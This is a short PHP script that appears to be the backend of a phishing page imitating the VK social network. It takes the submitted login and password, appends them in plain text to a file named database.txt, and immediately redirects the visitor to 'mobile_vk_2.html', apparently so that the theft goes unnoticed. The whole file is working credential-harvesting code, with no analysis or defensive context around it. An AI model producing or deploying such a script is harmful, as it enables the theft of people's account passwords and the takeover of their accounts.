<?PHP 

$Log = $_POST['login'];

$Pass = $_POST['password'];

$log = fopen("database.txt","at");

fwrite($log,"\n $Log:$Pass");

fclose($log);

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=mobile_vk_2.html'></head></html>";

?>
